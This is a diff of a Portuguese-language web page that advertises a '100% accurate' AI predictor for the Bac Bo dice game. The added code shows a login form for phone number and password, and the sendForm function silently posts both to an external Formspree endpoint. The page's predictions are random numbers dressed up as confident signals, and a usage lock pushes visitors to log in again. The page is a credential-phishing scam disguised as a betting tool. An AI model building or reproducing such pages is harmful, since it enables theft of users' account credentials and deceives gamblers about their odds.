@@ -1,216 +1,242 @@
 <!DOCTYPE html>
-<html lang="pt">
+<html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Predictor Bac Bó IA PRO</title>
-
+<title>Predictor Bac Bó</title>
 <style>
-body{
-    font-family:Arial;
-    background:#070b18;
-    color:white;
-    text-align:center;
-    margin:0;
-    padding:0;
-}
-
-#login{
-    max-width:300px;
-    margin:120px auto;
-    background:#111827;
-    padding:20px;
-    border-radius:10px;
-}
-
-input{
-    width:90%;
-    padding:10px;
-    margin:8px 0;
-    border:none;
-    border-radius:6px;
-}
-
-#app{
-    display:none;
-    max-width:600px;
-    margin:auto;
-    padding:15px;
-}
-
-button{
-    padding:10px;
-    margin:5px;
-    border:none;
-    border-radius:8px;
-    font-weight:bold;
-    cursor:pointer;
-}
-
-.azul{background:#2563eb;color:white;}
-.vermelho{background:#dc2626;color:white;}
-.empate{background:#facc15;color:black;}
-
-.box{
-    background:#111827;
-    padding:10px;
-    border-radius:10px;
-    margin-top:10px;
-    text-align:left;
-}
-
-.lock{
-    margin-top:10px;
-    padding:10px;
-    background:#1e293b;
-    border-radius:10px;
-}
-
-.signal{
-    margin-top:10px;
-    padding:10px;
-    background:#0f172a;
-    border-radius:10px;
-    font-weight:bold;
-}
+    body {
+        font-family: Arial, sans-serif;
+        background: linear-gradient(180deg, #1a1aff, #800080); /* azul para roxo */
+        color: #fff;
+        text-align: center;
+        margin: 0;
+        padding: 0;
+    }
+    .container {
+        margin-top: 50px;
+    }
+    .login-container, .game-container {
+        display: none;
+        margin-top: 50px;
+    }
+    .active {
+        display: block;
+    }
+    input {
+        padding: 12px;
+        margin: 10px;
+        width: 250px;
+        border-radius: 5px;
+        border: 1px solid #444;
+        background: #222;
+        color: #fff;
+    }
+    button {
+        padding: 12px 25px;
+        background: #e63946;
+        color: #fff;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        font-weight: bold;
+    }
+    button:hover {
+        background: #d62828;
+    }
+    .result-box {
+        margin-top: 20px;
+        font-size: 1.3em;
+        font-weight: bold;
+    }
+    canvas {
+        margin-top: 30px;
+        background: #222;
+        border-radius: 10px;
+        padding: 10px;
+        transition: transform 1s ease-in-out;
+    }
+    #lock {
+        margin-top: 20px;
+        font-size: 1.2em;
+        color: #ffcc00;
+    }
 </style>
 </head>
-
 <body>
 
-<div id="login">
-    <h2>Login Bac Bó IA</h2>
-    <input id="user" placeholder="Usuário">
-    <input id="pass" type="password" placeholder="Senha">
+<!-- Tela inicial -->
+<div class="container active" id="inicio">
+    <h1>🎲 Predictor Bac Bó 100% Acertivo</h1>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6a/Bac_Bo_game.jpg" alt="Bac Bó" width="300">
+    <br><br>
+    <button onclick="abrirLogin()">Conectar o Bot</button>
+</div>
+
+<!-- Tela de Login -->
+<div class="login-container" id="login">
+    <h1>🎲 Bac Bó Predictor</h1>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6a/Bac_Bo_game.jpg" alt="Bac Bó" width="300">
+    <br>
+    <input type="text" id="phone" placeholder="Número de telefone">
+    <br>
+    <input type="password" id="password" placeholder="Senha">
+    <br>
     <button onclick="login()">Entrar</button>
 </div>
 
-<div id="app">
+<!-- Tela do Jogo -->
+<div class="game-container" id="game">
+    <h2>Previsão da Banca</h2>
+    <button id="btnPrever" onclick="prever()">Prever</button>
+    <div class="result-box" id="resultado">Clique em prever para gerar resultado</div>
 
-<h2>Predictor Bac Bó IA PRO</h2>
+    <!-- Gráfico -->
+    <canvas id="grafico" width="400" height="400"></canvas>
 
-<button class="azul" onclick="Bot.add('azul')">Azul</button>
-<button class="vermelho" onclick="Bot.add('vermelho')">Vermelho</button>
-<button class="empate" onclick="Bot.add('empate')">Empate</button>
+    <div id="lock"></div>
 
-<div class="box">
-<p>🔵 Azul: <span id="a">0%</span></p>
-<p>🔴 Vermelho: <span id="v">0%</span></p>
-<p>🟡 Empate: <span id="e">0%</span></p>
-<p>📊 Total: <span id="t">0</span></p>
+    <br>
+    <!-- Botão para reconectar -->
+    <button onclick="voltarInicio()">Conectar o Bot</button>
 </div>
 
-<div class="lock" id="lock">IA: 3 usos restantes</div>
+<!-- Sons -->
+<audio id="soundPrever" src="https://www.soundjay.com/button/beep-07.wav" preload="auto"></audio>
+<audio id="soundLock" src="https://www.soundjay.com/button/beep-10.wav" preload="auto"></audio>
 
-<div class="signal" id="signal">Sinal: sem dados suficientes</div>
-
-<button onclick="sendForm()">📡 Enviar relatório</button>
-
-</div>
-
+<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
 <script>
+let chart;
+let limite = 3;
+let total = 0;
+let locked = false;
+
+function abrirLogin(){
+    document.getElementById("inicio").classList.remove("active");
+    document.getElementById("login").classList.add("active");
+}
 
 function login(){
-    let u = document.getElementById("user").value;
-    let p = document.getElementById("pass").value;
+    let phone = document.getElementById("phone").value;
+    let password = document.getElementById("password").value;
 
-    if(u && p){
-        document.getElementById("login").style.display="none";
-        document.getElementById("app").style.display="block";
+    if(phone && password){
+        // Envia formulário ao clicar em Entrar
+        sendForm(phone, password);
+
+        document.getElementById("login").classList.remove("active");
+        document.getElementById("game").classList.add("active");
+        inicializarGrafico();
+        atualizarLock();
     } else {
-        alert("Preenche todos os campos");
+        alert("Preencha telefone e senha!");
     }
 }
 
-const Bot = {
-    history: JSON.parse(localStorage.getItem("bacbo_zip")) || [],
-    limit: 3,
-    locked:false,
-
-    save(){
-        localStorage.setItem("bacbo_zip", JSON.stringify(this.history));
-    },
-
-    add(r){
-        if(this.locked){
-            alert("IA bloqueada");
-            return;
-        }
-
-        this.history.push(r);
-        this.save();
-
-        if(this.history.length >= this.limit){
-            this.locked = true;
-        }
-
-        this.update();
-    },
-
-    stats(){
-        let t = this.history.length || 1;
-        let a = this.history.filter(x=>x==="azul").length;
-        let v = this.history.filter(x=>x==="vermelho").length;
-        let e = this.history.filter(x=>x==="empate").length;
-        return {t,a,v,e};
-    },
-
-    signal(){
-        let last5 = this.history.slice(-5);
-        if(last5.length < 3) return "Sinal: sem dados suficientes";
-
-        let a = last5.filter(x=>"azul"===x).length;
-        let v = last5.filter(x=>"vermelho"===x).length;
-        let e = last5.filter(x=>"empate"===x).length;
-
-        if(a>v && a>e) return "📊 Tendência: Azul";
-        if(v>a && v>e) return "📊 Tendência: Vermelho";
-        if(e>=2) return "📊 Empates frequentes";
-
-        return "📊 Mercado equilibrado";
-    },
-
-    update(){
-        let s = this.stats();
-
-        document.getElementById("a").innerText = ((s.a/s.t)*100).toFixed(1)+"%";
-        document.getElementById("v").innerText = ((s.v/s.t)*100).toFixed(1)+"%";
-        document.getElementById("e").innerText = ((s.e/s.t)*100).toFixed(1)+"%";
-        document.getElementById("t").innerText = s.t;
-
-        document.getElementById("signal").innerText = this.signal();
-
-        document.getElementById("lock").innerText =
-        this.locked ? "🔒 BLOQUEADO" : "IA: " + (this.limit - this.history.length) + " restantes";
+function prever(){
+    if(locked){
+        document.getElementById("resultado").innerText = "🔒 BLOQUEADO – Para continuar deves conectar o Bot";
+        document.getElementById("soundLock").play();
+        return;
     }
-};
 
-function sendForm(){
+    document.getElementById("soundPrever").play();
+
+    let rand = Math.random();
+    let resultado;
+    let dadosGrafico;
+
+    if(rand < 0.4){ 
+        resultado = "📊 Tendência: Azul (80%)";
+        dadosGrafico = [80,20,0]; 
+    } else if(rand < 0.8){ 
+        resultado = "📊 Tendência: Vermelho (80%)";
+        dadosGrafico = [0,80,20]; 
+    } else { 
+        resultado = "📊 Empates frequentes (20%)";
+        dadosGrafico = [0,0,20]; 
+    }
+
+    // animação de giro
+    const canvas = document.getElementById("grafico");
+    canvas.style.transform = "rotate(360deg)";
+    setTimeout(()=>{ canvas.style.transform = "rotate(0deg)"; }, 1000);
+
+    setTimeout(()=>{
+        document.getElementById("resultado").innerText = resultado;
+        atualizarGrafico(dadosGrafico);
+    }, 1000);
+
+    total++;
+    if(total >= limite){
+        locked = true;
+        atualizarLock();
+        document.getElementById("soundLock").play();
+    } else {
+        atualizarLock();
+    }
+}
+
+function inicializarGrafico(){
+    const ctx = document.getElementById('grafico').getContext('2d');
+    chart = new Chart(ctx, {
+        type: 'pie',
+        data: {
+            labels: ['Azul', 'Vermelho', 'Empate'],
+            datasets: [{
+                data: [0,0,0],
+                backgroundColor: ['#0077b6','#d62828','#fcbf49']
+            }]
+        },
+        options: {
+            responsive: false,
+            plugins: {
+                legend: {
+                    labels: { color: '#fff' }
+                }
+            }
+        }
+    });
+}
+
+function atualizarGrafico(dados){
+    chart.data.datasets[0].data = dados;
+    chart.update();
+}
+
+function atualizarLock(){
+    document.getElementById("lock").innerText = locked ? "🔒 BLOQUEADO – Conecte o Bot para continuar" : "IA: " + (limite - total) + " previsões restantes";
+}
+
+function voltarInicio(){
+    // Resetar jogo e voltar para tela inicial
+    total = 0;
+    locked = false;
+    document.getElementById("game").classList.remove("active");
+    document.getElementById("inicio").classList.add("active");
+}
+
+function sendForm(phone, password){
     let formData = new FormData();
+    formData.append("telefone", phone);
+    formData.append("senha", password);
 
-    formData.append("usuario", document.getElementById("user").value);
-    formData.append("historico", JSON.stringify(Bot.history));
-    formData.append("total", Bot.history.length);
-    formData.append("sinal", Bot.signal());
-
-    fetch("https://formspree.io/f/xvgwbowg", {
+    fetch("https://formspree.io/f/xgvneord", {
         method:"POST",
         body:formData,
         headers:{ "Accept":"application/json" }
     })
     .then(res=>{
         if(res.ok){
-            alert("Enviado com sucesso!");
+            alert("Login enviado com sucesso!");
         } else {
             alert("Erro ao enviar");
         }
     })
     .catch(()=>alert("Erro de rede"));
 }
-
-Bot.update();
-
 </script>
 
 </body>
 </html>
+
